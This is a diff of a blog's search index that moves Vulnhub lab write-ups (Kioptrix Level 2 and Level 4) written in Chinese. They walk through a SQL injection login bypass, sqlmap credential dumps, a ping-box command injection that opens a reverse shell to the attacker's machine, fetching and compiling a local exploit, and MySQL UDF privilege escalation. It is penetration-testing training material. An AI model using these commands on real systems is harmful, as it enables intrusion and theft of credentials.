@@ -1,47 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Kioptix Level 2</title>
-    <url>/2021/12/05/Kioptrix-Level-2/</url>
-    <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>arp-scan -l</code><br><img src="/2021/12/05/Kioptrix-Level-2/1.png"></p>
-<p><code>nmap -sV 192.168.249.130</code>—查看开放端口</p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/2.png"></p>
-<p>—-<strong>访问下80端口</strong>—-<br><img src="/2021/12/05/Kioptrix-Level-2/3.png"></p>
-<p>发现是个登录框先试试万能密码</p>
-<p><strong>username:</strong><code>admin&#39; or 1=1#</code><br><strong>password:</strong><code>123(任意密码)</code></p>
-<p><strong>发现可以登陆，即存在sql注入</strong></p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/4.png"></p>
-<h4 id="二、0x00漏洞利用-sql注入"><a href="#二、0x00漏洞利用-sql注入" class="headerlink" title="二、0x00漏洞利用(sql注入)"></a>二、0x00漏洞利用(sql注入)</h4><p><strong>sqlmap跑一下数据</strong></p>
-<p><em><em>登陆框抓包,因为sql注入在username处，在username处标记</em>(减少测试时间),然后将数据包复制到1.txt中,再用sqlmap跑</em>*</p>
-<p><code>sqlmap -r 1 -level 3 -risk 2</code> –<br><img src="/2021/12/05/Kioptrix-Level-2/7.png"></p>
-<p><font color="red"><strong>sql注入盲注</strong></font><br><code>sqlmap -r 1 --dbs --level 4 --risk 3 -D &quot;webapp&quot; -T &#39;users&#39; -C &#39;id,password,username&#39; --dump</code>  –<strong>爆出用户名为admin，密码为5afac8d85f</strong></p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/11.png"></p>
-<p><font color="red"><strong>成功登录</strong></font></p>
-<h4 id="二、0x01漏洞利用-rce-amp"><a href="#二、0x01漏洞利用-rce-amp" class="headerlink" title="二、0x01漏洞利用(rce&amp;)"></a>二、0x01漏洞利用(rce&amp;)</h4><p><strong>进入后PING框，尝试命令执行</strong><br><img src="/2021/12/05/Kioptrix-Level-2/8.png"><br>发现可以命令执行，但当前为apache权限</p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/9.png"></p>
-<p><code>1&amp; bash -i &gt;&amp; /dev/tcp/192.168.249.132/4444 0&gt;&amp;1</code> -<strong>先弹shell到本地，此时为apache权限需要提权</strong></p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/10.png"></p>
-<p><code>lsb_release -a</code>–<strong>查看内核</strong></p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/12.png"></p>
-<p><code>searchsploit CentOS  4.5</code>–<strong>查找有无可利用的漏洞</strong></p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/13.png"></p>
-<p>9542.c没法wget,需要wget到kali机上，然后开启simpleHTTPserver<br><code>python -m SimpleHTTPServer 8000</code></p>
-<p><code>wget http://192.168.249.132:8000/9542.c</code></p>
-<p><strong>/var/www/html权限不够无法wget，先切换到tmp目录</strong></p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/14.png"></p>
-<p><code>gcc -o 9542 9542.c</code>—<strong>编译运行即可</strong></p>
-<p><img src="/2021/12/05/Kioptrix-Level-2/15.png"></p>
-<p><strong>—成功root—-</strong></p>
-]]></content>
-      <categories>
-        <category>Vulnhub系列</category>
-      </categories>
-      <tags>
-        <tag>Vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Kioptix Level 3</title>
     <url>/2021/12/07/Kioptrix-Level-3/</url>
     <content><![CDATA[<p><strong>靶机：192.168.249.131<br>kali: 192.168.249.132</strong></p>
@@ -78,37 +37,38 @@
       </tags>
   </entry>
   <entry>
-    <title>Kioptrix Level 4</title>
-    <url>/2021/12/09/Kioptrix-Level-4/</url>
-    <content><![CDATA[<p><strong>靶机：192.168.249.133</strong><br><strong>kali:192.168.249.132</strong></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.133</code> <strong>—查看开放端口</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/1.png"></p>
-<p><strong>—查看下80端口—</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/2.png"></p>
-<p><strong>—是个登录框可能猜测sql注入漏洞—</strong></p>
-<p><strong>—在用户名和密码处*标记，sqlmap跑一下</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/3.png"></p>
-<p><code>sqlmap -r 1.txt --level 3 -risk 2 --batch -D members -T members -C password,username --dump</code><strong>—爆出用户名john密码MyNameIsJohn</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/4.png"></p>
-<p><code>ssh john@192.168.249.133</code><strong>—–得到账号密码,先尝试ssh连接下</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/5.png"></p>
-<p><strong>—-可以连接但发现很多命令没法执行—</strong></p>
-<h4 id="二、逃逸受限shell"><a href="#二、逃逸受限shell" class="headerlink" title="二、逃逸受限shell"></a>二、逃逸受限shell</h4><p><a href="https://www.lshack.cn/653/" title="逃逸linux各种shell执行命令">逃逸linux各种shell执行命令</a></p>
-<p><code>echo os.system(&quot;/bin/bash&quot;)</code> <strong>–echo命令逃逸受限shell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/6.png"></p>
-<h4 id="三、权限提升-mysql-udf提权"><a href="#三、权限提升-mysql-udf提权" class="headerlink" title="三、权限提升(mysql udf提权)"></a>三、权限提升(mysql udf提权)</h4><p><code>uname -a</code> <strong>–先查看下内核</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/7.png"></p>
-<p><strong>–显然可以脏牛提权,但没有gcc—</strong></p>
-<p><code>cat /etc/passwd</code> –<strong>查看系统用户配置文件发现john和robert用户默认使用kshell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/8.png"></p>
-<p><code>ps -ef</code> <strong>-查看下进程</strong><br><img src="/2021/12/09/Kioptrix-Level-4/9.png"></p>
-<p><strong>–发现mysql是root权限–</strong></p>
-<p><code>mysql -u root</code>  <strong>–root无密码即可登录</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/10.png"></p>
-<p><strong>–学到了<font color="red">mysql udf提权</font>—</strong></p>
-<p><code>select * from func;</code> <strong>–发现有执行命令函数</strong><br><img src="/2021/12/09/Kioptrix-Level-4/11.png"></p>
-<p><strong>—可以赋予john用户root权限</strong></p>
-<p><code>select sys_exec(&#39;usermod -a -G admin john&#39;);</code> <strong>–赋予权限</strong></p>
-<p><code>sudo su</code> <strong>–输入john密码即拥有root权限</strong></p>
-<p><img src="/2021/12/09/Kioptrix-Level-4/12.png"></p>
+    <title>Kioptix Level 2</title>
+    <url>/2021/12/05/Kioptrix-Level-2/</url>
+    <content><![CDATA[<p><strong>靶机: 192.168.249.130<br>kali: 192.168.249.129</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>arp-scan -l</code><br><img src="/2021/12/05/Kioptrix-Level-2/1.png"></p>
+<p><code>nmap -sV 192.168.249.130</code>—查看开放端口</p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/2.png"></p>
+<p>—-<strong>访问下80端口</strong>—-<br><img src="/2021/12/05/Kioptrix-Level-2/3.png"></p>
+<p>发现是个登录框先试试万能密码</p>
+<p><strong>username:</strong><code>admin&#39; or 1=1#</code><br><strong>password:</strong><code>123(任意密码)</code></p>
+<p><strong>发现可以登陆，即存在sql注入</strong></p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/4.png"></p>
+<h4 id="二、0x00漏洞利用-sql注入"><a href="#二、0x00漏洞利用-sql注入" class="headerlink" title="二、0x00漏洞利用(sql注入)"></a>二、0x00漏洞利用(sql注入)</h4><p><strong>sqlmap跑一下数据</strong></p>
+<p><em><em>登陆框抓包,因为sql注入在username处，在username处标记</em>(减少测试时间),然后将数据包复制到1.txt中,再用sqlmap跑</em>*</p>
+<p><code>sqlmap -r 1 -level 3 -risk 2</code> –<br><img src="/2021/12/05/Kioptrix-Level-2/7.png"></p>
+<p><font color="red"><strong>sql注入盲注</strong></font><br><code>sqlmap -r 1 --dbs --level 4 --risk 3 -D &quot;webapp&quot; -T &#39;users&#39; -C &#39;id,password,username&#39; --dump</code>  –<strong>爆出用户名为admin，密码为5afac8d85f</strong></p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/11.png"></p>
+<p><font color="red"><strong>成功登录</strong></font></p>
+<h4 id="二、0x01漏洞利用-rce-amp"><a href="#二、0x01漏洞利用-rce-amp" class="headerlink" title="二、0x01漏洞利用(rce&amp;)"></a>二、0x01漏洞利用(rce&amp;)</h4><p><strong>进入后PING框，尝试命令执行</strong><br><img src="/2021/12/05/Kioptrix-Level-2/8.png"><br>发现可以命令执行，但当前为apache权限</p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/9.png"></p>
+<p><code>1&amp; bash -i &gt;&amp; /dev/tcp/192.168.249.132/4444 0&gt;&amp;1</code> -<strong>先弹shell到本地，此时为apache权限需要提权</strong></p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/10.png"></p>
+<p><code>lsb_release -a</code>–<strong>查看内核</strong></p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/12.png"></p>
+<p><code>searchsploit CentOS  4.5</code>–<strong>查找有无可利用的漏洞</strong></p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/13.png"></p>
+<p>9542.c没法wget,需要wget到kali机上，然后开启simpleHTTPserver<br><code>python -m SimpleHTTPServer 8000</code></p>
+<p><code>wget http://192.168.249.132:8000/9542.c</code></p>
+<p><strong>/var/www/html权限不够无法wget，先切换到tmp目录</strong></p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/14.png"></p>
+<p><code>gcc -o 9542 9542.c</code>—<strong>编译运行即可</strong></p>
+<p><img src="/2021/12/05/Kioptrix-Level-2/15.png"></p>
+<p><strong>—成功root—-</strong></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
@@ -215,6 +175,46 @@
 <p><img src="/2021/12/15/Tr0ll-1/17.png"><br><img src="/2021/12/15/Tr0ll-1/18.png"></p>
 <p><img src="/2021/12/15/Tr0ll-1/19.png"><br><strong>–保存后便可以在kali上免密登录靶机root权限–</strong></p>
 <p><strong>我vi不精通，脚本复制不过去。。。。试了好几次。。。</strong></p>
+]]></content>
+      <categories>
+        <category>Vulnhub系列</category>
+      </categories>
+      <tags>
+        <tag>Vulnhub</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Kioptrix Level 4</title>
+    <url>/2021/12/09/Kioptrix-Level-4/</url>
+    <content><![CDATA[<p><strong>靶机：192.168.249.133</strong><br><strong>kali:192.168.249.132</strong></p>
+<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p><code>nmap -sV 192.168.249.133</code> <strong>—查看开放端口</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/1.png"></p>
+<p><strong>—查看下80端口—</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/2.png"></p>
+<p><strong>—是个登录框可能猜测sql注入漏洞—</strong></p>
+<p><strong>—在用户名和密码处*标记，sqlmap跑一下</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/3.png"></p>
+<p><code>sqlmap -r 1.txt --level 3 -risk 2 --batch -D members -T members -C password,username --dump</code><strong>—爆出用户名john密码MyNameIsJohn</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/4.png"></p>
+<p><code>ssh john@192.168.249.133</code><strong>—–得到账号密码,先尝试ssh连接下</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/5.png"></p>
+<p><strong>—-可以连接但发现很多命令没法执行—</strong></p>
+<h4 id="二、逃逸受限shell"><a href="#二、逃逸受限shell" class="headerlink" title="二、逃逸受限shell"></a>二、逃逸受限shell</h4><p><a href="https://www.lshack.cn/653/" title="逃逸linux各种shell执行命令">逃逸linux各种shell执行命令</a></p>
+<p><code>echo os.system(&quot;/bin/bash&quot;)</code> <strong>–echo命令逃逸受限shell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/6.png"></p>
+<h4 id="三、权限提升-mysql-udf提权"><a href="#三、权限提升-mysql-udf提权" class="headerlink" title="三、权限提升(mysql udf提权)"></a>三、权限提升(mysql udf提权)</h4><p><code>uname -a</code> <strong>–先查看下内核</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/7.png"></p>
+<p><strong>–显然可以脏牛提权,但没有gcc—</strong></p>
+<p><code>cat /etc/passwd</code> –<strong>查看系统用户配置文件发现john和robert用户默认使用kshell</strong><br><img src="/2021/12/09/Kioptrix-Level-4/8.png"></p>
+<p><code>ps -ef</code> <strong>-查看下进程</strong><br><img src="/2021/12/09/Kioptrix-Level-4/9.png"></p>
+<p><strong>–发现mysql是root权限–</strong></p>
+<p><code>mysql -u root</code>  <strong>–root无密码即可登录</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/10.png"></p>
+<p><strong>–学到了<font color="red">mysql udf提权</font>—</strong></p>
+<p><code>select * from func;</code> <strong>–发现有执行命令函数</strong><br><img src="/2021/12/09/Kioptrix-Level-4/11.png"></p>
+<p><strong>—可以赋予john用户root权限</strong></p>
+<p><code>select sys_exec(&#39;usermod -a -G admin john&#39;);</code> <strong>–赋予权限</strong></p>
+<p><code>sudo su</code> <strong>–输入john密码即拥有root权限</strong></p>
+<p><img src="/2021/12/09/Kioptrix-Level-4/12.png"></p>
 ]]></content>
       <categories>
         <category>Vulnhub系列</category>
